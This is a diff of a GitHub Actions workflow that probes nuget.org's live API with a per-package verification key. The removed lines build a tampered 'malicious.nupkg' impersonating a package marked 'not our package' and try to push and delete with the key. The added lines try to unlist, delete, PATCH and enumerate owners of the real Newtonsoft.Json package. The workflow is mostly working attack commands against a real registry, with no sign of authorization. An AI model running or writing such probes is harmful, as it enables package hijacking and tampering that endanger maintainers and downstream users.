@@ -33,56 +33,62 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Exploit verification key
+      - name: Explore verification key capabilities
         run: |
-          # Get verification key for DynamoOnline (not our package)
-          echo "=== Get verification key for DynamoOnline ==="
-          VERIFY_RESP=$(curl -s -X POST "https://www.nuget.org/api/v2/package/create-verification-key/DynamoOnline/1.0.0" \
+          # Get verification key for Newtonsoft.Json
+          echo "=== Get verification key for Newtonsoft.Json ==="
+          VERIFY_RESP=$(curl -s -X POST "https://www.nuget.org/api/v2/package/create-verification-key/Newtonsoft.Json/13.0.3" \
             -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "Content-Type: application/json" \
             -H "Content-Length: 0" \
             -d "")
           echo "Response: $VERIFY_RESP"
-          
           VERIFY_KEY=$(echo "$VERIFY_RESP" | jq -r '.Key')
-          echo "Got key: $VERIFY_KEY"
           
-          # Create a malicious DynamoOnline package
-          cd artifacts
-          ORIG_PKG=$(ls *.nupkg)
-          rm -rf tampered && mkdir tampered
-          unzip -q -o "$ORIG_PKG" -d tampered
-          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
-          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>99.0.0</version>|g" {} \;
-          cd tampered && zip -q -r ../malicious.nupkg . && cd ..
-          
-          echo -e "\n=== Test 1: Push with verification key ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
-            -H "X-NuGet-Client-Version: 6.0.0" \
-            -H "X-NuGet-Protocol-Version: 4.1.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @malicious.nupkg
-          
-          echo -e "\n\n=== Test 2: Verify endpoint - does it validate ownership? ==="
-          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/verifykey/DynamoOnline/1.0.0" \
+          echo -e "\n=== Test verifykey endpoint with the key ==="
+          # This is what the key is supposed to be used for
+          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/verifykey/Newtonsoft.Json/13.0.3" \
             -H "X-NuGet-ApiKey: $VERIFY_KEY"
           
-          echo -e "\n\n=== Test 3: Delete package with verification key? ==="
-          curl -s -w "\nHTTP:%{http_code}" -X DELETE "https://www.nuget.org/api/v2/package/DynamoOnline/1.0.0" \
-            -H "X-NuGet-ApiKey: $VERIFY_KEY"
-          
-          echo -e "\n\n=== Test 4: Get verification key for Newtonsoft.Json ==="
-          curl -s -w "\nHTTP:%{http_code}" -X POST "https://www.nuget.org/api/v2/package/create-verification-key/Newtonsoft.Json/13.0.3" \
+          echo -e "\n\n=== What does verifykey return for our OWN package? ==="
+          OWN_VERIFY=$(curl -s -X POST "https://www.nuget.org/api/v2/package/create-verification-key/DynamoTest456/1.0.0" \
             -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "Content-Type: application/json" \
             -H "Content-Length: 0" \
-            -d ""
+            -d "")
+          echo "Own key response: $OWN_VERIFY"
+          OWN_KEY=$(echo "$OWN_VERIFY" | jq -r '.Key')
           
-          echo -e "\n\n=== Test 5: What other endpoints accept this key? ==="
-          # Try to list package versions
-          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/package/DynamoOnline" \
+          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/verifykey/DynamoTest456/1.0.0" \
+            -H "X-NuGet-ApiKey: $OWN_KEY"
+          
+          echo -e "\n\n=== Try symbol package endpoints ==="
+          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/symbolpackage/" \
+            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
+            -H "Content-Type: application/octet-stream" \
+            -H "Content-Length: 0"
+          
+          echo -e "\n\n=== Try relist/unlist with verify key ==="
+          curl -s -w "\nHTTP:%{http_code}" -X POST "https://www.nuget.org/api/v2/package/Newtonsoft.Json/13.0.3" \
+            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
+            -H "Content-Length: 0"
+          
+          curl -s -w "\nHTTP:%{http_code}" -X DELETE "https://www.nuget.org/api/v2/package/Newtonsoft.Json/13.0.3" \
             -H "X-NuGet-ApiKey: $VERIFY_KEY"
+          
+          echo -e "\n\n=== Try v3 API endpoints ==="
+          curl -s -w "\nHTTP:%{http_code}" -X GET "https://api.nuget.org/v3/registration5-gz-semver2/newtonsoft.json/index.json" \
+            -H "X-NuGet-ApiKey: $VERIFY_KEY"
+          
+          echo -e "\n\n=== Can we enumerate who owns Newtonsoft.Json? ==="
+          curl -s -w "\nHTTP:%{http_code}" "https://www.nuget.org/packages/Newtonsoft.Json/Owners" \
+            -H "X-NuGet-ApiKey: $VERIFY_KEY"
+          
+          echo -e "\n\n=== Try package metadata update? ==="
+          curl -s -w "\nHTTP:%{http_code}" -X PATCH "https://www.nuget.org/api/v2/package/Newtonsoft.Json/13.0.3" \
+            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
+            -H "Content-Type: application/json" \
+            -d '{"listed": false}'
 
         env:
           NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
